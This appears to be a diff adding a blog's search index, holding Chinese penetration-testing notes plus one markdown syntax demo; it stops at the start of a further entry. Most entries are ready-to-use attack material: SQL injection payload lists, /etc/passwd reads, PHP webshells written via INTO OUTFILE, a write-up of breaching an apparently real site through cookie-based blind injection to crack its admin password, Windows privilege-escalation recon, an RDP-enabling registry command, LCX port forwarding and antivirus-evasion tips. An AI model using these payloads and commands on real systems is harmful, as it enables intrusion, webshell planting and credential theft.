@@ -1,0 +1,2003 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>HTTP Header 注入</title>
+    <url>/2020/02/17/HTTP-Header-%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="可注入参数"><a href="#可注入参数" class="headerlink" title="可注入参数"></a>可注入参数</h1><ul>
+<li>cookie</li>
+<li>Referer</li>
+<li>User-Agent</li>
+<li>X-Forwarded-for</li>
+<li>Client-IP</li>
+<li>Host</li>
+</ul>
+<h1 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,&#x2F;;q&#x3D;0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0&#39;(select*from(select(sleep(20)))a) #</span><br><span class="line">Accept-Encoding: gzip, deflate, sdch</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.8,fr;q&#x3D;0.6</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一般配合报错注入。</p>
+]]></content>
+      <tags>
+        <tag>其他注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MYSQL注入</title>
+    <url>/2020/02/14/MYSQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>union select可以查询两张不同表内的数据（取交集）。前提是前后列数相同，列也必须拥有相同的数据类型。</p>
+<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><ol>
+<li><p>判断注入点 </p>
+</li>
+<li><p>猜字段数 order by</p>
+</li>
+<li><p>联合查询：</p>
+<ul>
+<li><p><code>1&#39; union select database(),user() #</code>  获取当前数据库和数据库用户名</p>
+</li>
+<li><p><code>1&#39; union select version(),@@version_compile_os#</code> 获取当前的数据库版本和操作系统</p>
+<p>当MySQL的版本小于4.0时，是不支持union select联合查询的。当MySQL版本小于5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
+</li>
+<li><p><code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>  获取数据表名</p>
+</li>
+<li><p><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code> 获取表中的列名</p>
+</li>
+</ul>
+</li>
+<li><p>获取数据</p>
+<ul>
+<li><code>1&#39; union select user,password from users#</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul>
+<li><p>当在⼀个聚合函数，比如count函数后面如果使用分组语句就会把查询的⼀部分以错误的形式显⽰出来。当页面没有显位的时候，通过报错来获得显位，替换显位的语句来获取数据。</p>
+</li>
+<li><p>常用函数</p>
+<ol>
+<li>floor()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></li>
+</ul>
+<ol start="2">
+<li>extractvalue()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></li>
+</ul>
+<ol start="3">
+<li>updatexml()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></li>
+</ul>
+<ol start="4">
+<li>geometrycollection()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="5">
+<li>multipoint()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="6">
+<li>polygon()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="7">
+<li>multipolygon()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<ol start="8">
+<li>linestring()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code><br>​</li>
+</ul>
+<ol start="9">
+<li>multilinestring()</li>
+</ol>
+<ul>
+<li><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></li>
+</ul>
+<p>​10. exp()</p>
+<ul>
+<li><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></li>
+</ul>
+</li>
+<li><p>以上payload自行找资料理解原理</p>
+</li>
+</ul>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>页面无显位只能返回正常和错误两种情况。</li>
+<li>通过不停地测试返回结果判别语句执行结果。</li>
+<li>常用函数<ol>
+<li>length()返回长度</li>
+<li>substr()截取字符串</li>
+<li>ascii()返回字符ASCII码</li>
+<li>sleep()将程序挂起一段时间</li>
+</ol>
+</li>
+</ul>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断注入类型，数字or字符</li>
+<li>猜数据库名：<ol>
+<li>猜长度  <code>1&#39;  and length(database())=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code></li>
+</ol>
+</li>
+<li>猜表名：<ol>
+<li>猜表的数量 <code>1&#39; and (select count (table_name) from information_schema.tables where table_schema=database())=1 #</code></li>
+<li>猜第一个表的长度  <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 #</code></li>
+</ol>
+</li>
+<li>猜字段名：<ol>
+<li>猜字段数量  <code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=1 #</code></li>
+<li>猜第一个字段长度   <code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1,1))&gt;97 #</code></li>
+</ol>
+</li>
+<li>猜解数据<ol>
+<li>二分法  <code>1&#39; and ascii(substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #</code></li>
+<li>暴力  <code>1&#39; and (select count(*) from users where user = &#39;admin&#39;) = 1 #</code></li>
+</ol>
+</li>
+</ol>
+<h1 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>不管语句执行正确或错误返回结果都一样。只能靠时间盲注。</li>
+<li>if(condition,A,B) condition成立，则A，否则B。</li>
+<li>mysql&gt;=5.0 使⽤sleep()进⾏查询   <code>id=1 and sleep(5)</code>，mysql&lt;5.0使用benchmark()进行查询  <code>select benchmark(1000,select * from admin);</code> 通过查询次数增多，时间变得缓慢来判断是否存在延迟。</li>
+</ul>
+<h2 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断是否存在延迟注入  <code>id=1 and sleep(5)</code></li>
+<li>判断当前用户  <code>and if(ascii(substr(user(),1,1))=114,sleep(5),1)</code></li>
+<li>判断数据库名长度 <code>if(length(database())=8,sleep(5),1)</code></li>
+<li>猜解数据库名称  <code>and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)</code></li>
+<li>猜解表名  <code>and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1);</code></li>
+<li>猜解列名 <code>and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;admin&#39; limit,0,1),1,1))&gt;100,sleep(5),1)</code></li>
+<li>猜数据  <code>and if(ascii(substr((select password from admin limit 0,1),1,1))&gt;100,sleep(5),1)</code></li>
+</ol>
+<h1 id="root权限处理"><a href="#root权限处理" class="headerlink" title="root权限处理"></a>root权限处理</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul>
+<li>当前连接到的mysql用户具有root权限</li>
+<li>能获取到网站的物理路径（phpinfo、报错、爆破…） </li>
+<li>5.5.53之前的版本是secure_file_priv 变量默认为空，所以默认情况下是可以直接通过SQL语句来导出文件的。高于5.5时，mysql新出了一个secure-file-priv 字段 : secure-file-priv 参数是用来限制读写文件。查看secure-file-priv 参数的值:  <code>show global variables like &#39;%secure%&#39;</code></li>
+</ul>
+<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol>
+<li><p>读文件</p>
+<ul>
+<li><code>select load_file(&#39;/etc/passwd&#39;);</code></li>
+<li><code>select load_file(0x2F6574632F706173737764);</code> 文件路径可换成16进制</li>
+</ul>
+</li>
+<li><p>写文件</p>
+<ul>
+<li><p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符</p>
+</li>
+<li><p>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</p>
+</li>
+<li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into outfile &#39;/var/www/html/muma.php&#39; ;</code>  注意，有时候斜杠要转义，用双斜杠代替</p>
+</li>
+<li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;/var/www/html/muma.php&#39; ;</code></p>
+</li>
+<li><p><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;</code></p>
+</li>
+<li><p>LINES STARTING BY ‘写⼊的内容’：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</p>
+</li>
+<li><p>LINES TERMINATED BY ‘写⼊的内容’：设置每行数据结尾的字符，可以为单个或多个字符。默认值是”\n”。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><code>http://www.dark5.net/index.php?id=1 and 1=2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;/var/www/html/1.php&#39; --</code></p>
+<h2 id="GPC的问题"><a href="#GPC的问题" class="headerlink" title="GPC的问题"></a>GPC的问题</h2><p>PHP开启GPC以后，会把接收的字符加上反斜杠转义。</p>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP和MYSQL学习</title>
+    <url>/2020/02/11/PHP%E5%92%8CMYSQL%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><ul>
+<li>对于PHP和MYSQL，在刚接触渗透的时候就有了解过，由于基础不是很扎实以及了解不深入，决定再过一遍。</li>
+<li>个人觉得PHP和大多数编程语言一样基础语法相通，需要记的应该是容易引起漏洞的变量和函数。MYSQL也一样，基本的查询过一遍后重点了解和注入有关的语句用法以及特性。</li>
+</ul>
+<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ol>
+<li><p>PHP变量以$符号开头，对大小写敏感，命名规则和其他语言差不多，且变量类型不需要定义。</p>
+</li>
+<li><p>超全局变量：</p>
+<p>$GLOBALS  可在任意位置访问 是一个数组 存储了所有全局变量<br>$_SERVER  保存了报头、路径和脚本位置信息<br>$_REQUEST  用于收集表单数据<br>$_POST  收集POST请求提交的数据<br>$_GET  收集GET请求提交的数据<br>$_FILES  用于文件上传<br>$_ENV  服务器环境变量<br>$_COOKIE  用于会话控制<br>$_SESSION  同上</p>
+</li>
+<li><p>表单处理时，$_SERVER[“PHP_SELF”] 能将表单数据发送到页面本身而不用去请求其他页面，但这也可能引发xss漏洞。</p>
+</li>
+<li><p>包含函数：include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中，用于文件包含，但这也容易引发漏洞。</p>
+<p>php 中引发文件包含漏洞的通常是以下四个函数：<br>1、include() 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。<br>3、require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行<br>4、require_once() 它的功能与 require() 相同，区别在于当重复调用同一文件时，程序只调用一次。<br>当使用这四个函数包含一个新文件时，该文件将作为 PHP 代码执行，PHP 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 URL、也都将作为 PHP 代码执行</p>
+</li>
+<li><p>代码执行函数：</p>
+<p>eval 函数：把字符串按照 PHP 代码来执行</p>
+<p>assert函数：检查一个断言是否为 FALSE，如果 是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
+<p>preg_replace函数：执行一个正则表达式的搜索和替换，当$pattern为/e，会把replacement参数当成PHP代码执行。</p>
+<p>array_map函数：将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p>
+</li>
+<li><p>命令执行函数：</p>
+<p> exec函数：执行一个外部程序</p>
+<p>shell_exec函数：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回（安全模式不能使用）</p>
+<p>passthru函数：执行外部程序并且显示原始输出</p>
+<p>system函数：执行外部程序，并且显示输出</p>
+<p>proc_open函数：proc_open — 执行一个命令，并且打开用来输入/输出的文件指针</p>
+<p>popen函数：打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
+</li>
+<li><p>文件操作函数：</p>
+<p>不一一列举，涉及到文件操作都有可能产生漏洞</p>
+</li>
+<li><p>其他：</p>
+<p>phpinfo函数：输出PHP当前状态的各种信息、服务器信息及系统信息等</p>
+<p>ini_set函数：修改和设置PHP环境配置参数</p>
+<p>ini_restore函数：恢复PHP环境配置参数至初始值</p>
+</li>
+<li><p>总结：需要通过查看大量案例理解、复现每个漏洞产生的原理，不仅限于理论。</p>
+</li>
+</ol>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><ol>
+<li>基础就是增删查改。重点在于查询。UPDATE 更新数据，ALTER修改表和字段名，DELETE删除这种涉及到修改数据库内容的要慎用。</li>
+<li>涉及到查询范围的。WHERE字句是常用的，设定一个查询范围：<code>SELECT * FROM TABLE_NAME WHERE id=1;</code>  更粗略的查询的可以加上与LIKE子句连用 <code>WHERE name LIKE &#39;admin%&#39;</code>  。</li>
+<li>联合查询UNION是注入里比较常用的，他可以联合两个以上的SELECT语句结果到一个集合当中。UNION会合并重复数据，UNION ALL 不会。</li>
+<li>排序ORDER BY 将结果按某一字段排序，经常用于判断表内的字段数。ORDER BY 1表示按第一个栏位排序，2表示第二个以此类推，达到最大字段数再增加就会产生错误。SQL为什么要判断字段数，当有回显的时候，需要判断显示位，就需要保持联合查询前后的语句的字段数是一样的。</li>
+<li>分组GROUP BY根据一个或多个列对结果集进行分组。一般会和COUNT(*)连用。比如   <code>SELECT username,count(*) FROM users GROUP BY username</code> 这时候形成了一个新的表，在最开始的时候后我们看到的是一个username-count()的空表，但是在GROUP BY执行过程中，一行一行的去扫描原始表的username字段，如果username在username-count()不存在，那么就将他插入，并置count()置1，如果username在username-count()表中已经存在，那么就在原来的count(*)基础上加1，就这样直到扫描完整个表，就得到一个新的表了。这个经常用于报错注入，具体还是等以后学到SQL注入再分析。</li>
+<li>等值连接INNER JION 用于获取两个表中字段匹配关系的记录。这个经常用于偏移注入，具体原理也是等后面分析。</li>
+<li>函数：CONCAT()合并字符串用于绕过，ASCII()返回字符的ASCII码用于布尔盲注，MID()截取字符串用于逐字猜解等等都是常用于手工注入的函数。具体后面再将</li>
+<li>总结：基本的SQL语句都是相同的，但不同的数据库有不同的特性，注入的方法也是不同的。</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>基础学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Access数据库的cookie盲注</title>
+    <url>/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><ul>
+<li>网站各敏感信息均已打马</li>
+<li>已将漏洞上报</li>
+<li>内容仅供学习，切勿用于非法行为，否则后果自负</li>
+</ul>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol>
+<li><p>首先收集信息。简单扫描了一下发现是个IIS+ASP.NET+Access的网站。有一个内网的IP可以访问是登录OA系统的，通过目录枚举找到网站的后台管理页面/admin。</p>
+<ul>
+<li><p>OA页面是这样的</p>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/1.png" alt="login"></p>
+</li>
+</ul>
+<p>试了下弱密码，万能密码都不行</p>
+<ul>
+<li><p>然后是后台页面</p>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/2.png" alt="adminlogin"></p>
+</li>
+</ul>
+<p>弱密码万能密码，也都不行。这个验证码在前端看了一下，其实提交会传两个，还有个是hidden属性的，里面直接填了验证码的值。那可以试试爆破。发现只要两个验证码的值一样就能通过验证，根本不需要后台的传值。但由于改网站在cookie方面做了防护，会定时更换。爆破一会就会进行安全检查，没办法继续。</p>
+</li>
+<li><p>后台没办法就只能从前端页面找了</p>
+<ul>
+<li><p>瞎逛了一圈，找了几个能传参的地方试注入，结果发现有waf。百度查了一下wts-waf。好像是个很弱鸡的，直接能加号绕过空格。尝试一下and 1=1 and 1=0，发现确实存在注入。但没回显，就很难受。</p>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/3.png" alt="page"></p>
+</li>
+</ul>
+<p>好嘛，那只能盲注了。试了一下绕过加盲注，根本不行。括号里的内容再用加号就扑街，没法执行。那咋办。</p>
+<p>没办法，只能用没括号的语句先猜一下表和字段名了。order by测出有13条语句，再联合查询，测出admin表存在，然后修改联合查询，用通配符替换后面的数字，发现admin居然有五个字段。晕了。然后再替换前面的数字为字段名，user，password什么的都试一下，发现全报错。操。那咋办？？</p>
+</li>
+</ol>
+<h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><ol>
+<li>经过我不懈努力，各种查资料，发现可以尝试从登录页面的前端入手，name属性的值很有可能和字段名一致。去看了看前端的源码。</li>
+</ol>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/4.png" alt="source"></p>
+<p>​    试了一下，居然成了？？好吧，表和字段都有了，但是没回显，普通盲注又不行，咋办。</p>
+<ol start="2">
+<li><p>又是一通瞎几把找资料，发现Access还可能出现cookie注入。简单来说就是后端接收变量不明确，可能把cookie内的值也当做数据库查询的值代入查询了。这种方法可以用来绕过一般的waf。试了一下，在cookie里加入id=xxx这样的值，然后把url后面的?id=xxx去掉，可以正常访问。说明存在cookie注入。那现在就需要把盲注的语句放到cookie里就行了！</p>
+</li>
+<li><p>盲注就不多说了，资料都有。大概就是这样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;xxx and(select top 1 len(admin_name) from admin)&gt;5</span><br><span class="line">?id&#x3D;xxx and(select top 1 asc(mid(admin_name,1,1)) from admin)&gt;100</span><br></pre></td></tr></table></figure>
+
+<p>先判断字段长度，然后逐字猜解。用户名5位，admin，很容易就搞出来了，密码16位有点长，这里就推荐用burp爆破，修改cookie里的值，看返回的数据包长度判断执行结果，这里不多赘述。</p>
+<p>最后得出来的ASCII码值对照表翻译一下得到一串密文。目测16位的md5加密</p>
+<p>最后扔到cmd5解密一下就出来了。登录进去</p>
+</li>
+</ol>
+<p><img src="/2020/02/11/Access%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84cookie%E7%9B%B2%E6%B3%A8/5.png" alt="admin"></p>
+<p>图片管理处可以上传图片，不知道能不能传个马什么的进一步提权，到这里就不再深入了，毕竟是学习为主。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>一杯茶，一包烟，一个破站日一天，真的没错。这一个小破站就花了我几天的时间去研究。不过通过搜索资料还是很有收获的。学习了很多思路和技巧。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>渗透实战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown 语法学习</title>
+    <url>/2020/02/10/markdown-%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p><strong>加粗</strong> <em>倾斜</em>  <strong><em>粗斜体</em></strong>  <del>删除线</del></p>
+<blockquote>
+<p>引用</p>
+<blockquote>
+<p>继续引用</p>
+</blockquote>
+</blockquote>
+<p>分割线</p>
+<hr>
+<p>图片：</p>
+<p><img src="https://i0.hdslb.com/bfs/article/1bc392a3b58e084b35598d5db20ced92a1428ac8.jpg@1320w_1180h.webp" alt="picture" title="乃爱~"></p>
+<p>超链接：</p>
+<p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度，搜索滴神！</a></p>
+<p>无序列表：</p>
+<ul>
+<li>qwerasd</li>
+<li>asdfzxc</li>
+</ul>
+<p>有序列表：</p>
+<ol>
+<li>啊</li>
+<li>啊？</li>
+</ol>
+<p>嵌套列表：</p>
+<ul>
+<li>乌兹！<ul>
+<li>永远滴神！</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>乌兹！<ol>
+<li>别克斯坦</li>
+</ol>
+</li>
+</ol>
+<p>表格：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th align="center">name</th>
+<th align="right">password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td align="center">user</td>
+<td align="right">1234</td>
+</tr>
+</tbody></table>
+<p>代码：</p>
+<p><code>print(&quot;hello&quot;)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def hello():</span><br><span class="line">	print(&quot;hello&quot;)</span><br><span class="line">hello()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>基础学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows提权</title>
+    <url>/2020/02/25/Windows%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h1><ul>
+<li>当前系统版本，使用ver命令</li>
+<li>systeminfo，查看系统比较详细的信息，菜刀使用这条命令可能超时。可以进行重定向操作，systeminfo &gt; systeminfo.txt 执行以后会在网站目录下生成一个文件，查看内容即可。</li>
+<li>开放端口，netstat -ano</li>
+<li>所安装的防护软件<ul>
+<li>net start  查看自启动服务</li>
+<li>tasklist  查看进程列表</li>
+<li>dir /a  “c:\program files (x86)”  安装目录 (注：菜刀中路径有空格要用双引号括起来,不然可能找不到）</li>
+<li>c:\program files  安装目录</li>
+<li>wmic /NAMESPACE:”\\root\CIMV2” PATH Win32_Product get name  列出系统安装了什么程序，比较慢的时候也建议用重定向。</li>
+</ul>
+</li>
+<li>当前系统的补丁程序<ul>
+<li>wmic qfe get hotfixid</li>
+<li>wmic qfe get Caption,Description,HotFixID,InstalledOn</li>
+</ul>
+</li>
+<li>可写可读目录（执行不了cmd命令的时候，自己传一个cmd.exe到可读写目录，在菜刀里setp+cmd路径可以设置用自己上传的cmd执行命令，cmd版本要和目标系统cmd版本相匹配）<ul>
+<li>可读写目录探测脚本</li>
+<li>c:\windows\temp\</li>
+<li>%temp%\</li>
+<li>c:\recycler\</li>
+<li>c:$Recycle.Bin\</li>
+<li>d:$Recycle.Bin</li>
+</ul>
+</li>
+</ul>
+<h1 id="最优提权方法选择"><a href="#最优提权方法选择" class="headerlink" title="最优提权方法选择"></a>最优提权方法选择</h1><h2 id="远程溢出（远程代码执行）"><a href="#远程溢出（远程代码执行）" class="headerlink" title="远程溢出（远程代码执行）"></a>远程溢出（远程代码执行）</h2><p>如果是内网，无法进行，拿到webshell以后需要把端口转发出来进行溢出和远程代码执行。</p>
+<ul>
+<li>ms08067</li>
+<li>ms17010</li>
+<li>CVE-2017-7494（linux）</li>
+</ul>
+<h2 id="服务器文件存放密码"><a href="#服务器文件存放密码" class="headerlink" title="服务器文件存放密码"></a>服务器文件存放密码</h2><h2 id="第三方高权限应用提取"><a href="#第三方高权限应用提取" class="headerlink" title="第三方高权限应用提取"></a>第三方高权限应用提取</h2><ul>
+<li>mysql</li>
+<li>mssql</li>
+<li>oracle</li>
+<li>……</li>
+</ul>
+<h2 id="本地溢出"><a href="#本地溢出" class="headerlink" title="本地溢出"></a>本地溢出</h2><p>有溢出先看能不能溢出</p>
+<h2 id="系统错误配置"><a href="#系统错误配置" class="headerlink" title="系统错误配置"></a>系统错误配置</h2><ul>
+<li>Apache+Windows</li>
+</ul>
+<h2 id="DLL劫持漏洞"><a href="#DLL劫持漏洞" class="headerlink" title="DLL劫持漏洞"></a>DLL劫持漏洞</h2><h1 id="exploit寻找下载"><a href="#exploit寻找下载" class="headerlink" title="exploit寻找下载"></a>exploit寻找下载</h1><p>微软已经公布的漏洞，一般不久就会在GitHub出现Exploit，还有就是关注一些国外的大牛安全研究员，还有可能会出现在国内的安全论坛，更多的是国外安全研究者发布。</p>
+<ul>
+<li><p>github</p>
+</li>
+<li><p>google hacking  :  site:github.com exploit</p>
+</li>
+<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+</li>
+<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+</li>
+<li><p>安全社区，T00ls、quansec。</p>
+</li>
+<li><p>安全门户，freebuf、安全客</p>
+</li>
+<li><p>小密圈。</p>
+</li>
+<li><p>k8</p>
+</li>
+<li><p>metasploit</p>
+<p><code>msf5 &gt; search exploit/windows/local/</code></p>
+</li>
+</ul>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>确定没有补丁以后，从最新的exp开始到之前的不同版本的exp换着试。</li>
+<li>x86是32位系统，传exe也要传对应的。</li>
+<li>exp上传的目录一般需要读写权限，有的大马可以查看可读写目录，查看补丁安装情况。</li>
+<li>二进制文件可以任意修改后缀</li>
+<li>aspx比asp权限大</li>
+<li>可写可读目录查找</li>
+<li>各种马<ul>
+<li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h1><ul>
+<li>如果是匹配md5，修改任意特征码，比如bannner信息，再编译就行</li>
+<li>如果是拦截危险行为，只能把exp注入到内存。比较难搞</li>
+</ul>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="常用案例"><a href="#常用案例" class="headerlink" title="常用案例"></a>常用案例</h2><ul>
+<li>连接mysql，把3306转发到VPS上某个端口，然后连接VPS上的端口就行</li>
+<li>3389</li>
+<li>打开端口命令<ul>
+<li>REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /vfDenyTSConnections /t REG_DWORD /d 0 /f</li>
+<li>注，在菜刀里执行 双引号要转义才能正确执行，因为用提取工具执行命令，命令也是放在双引号里的。xxx.exe “whoami”</li>
+</ul>
+</li>
+</ul>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
+<li>VPS一台</li>
+<li>转发工具<ul>
+<li>LCX <ul>
+<li>在vps上  ./lcx -m 2 -p1 8082 -p2 999将8082端口的数据转发到999端口</li>
+<li>然后在目标服务器上 lcx.exe -slave vps的ip 8082 127.0.0.1 3389</li>
+<li>最好保证vps和目标服务器都是同操作系统，lcx版本相同。</li>
+</ul>
+</li>
+<li>NAT bypass</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msf之meterpreter</title>
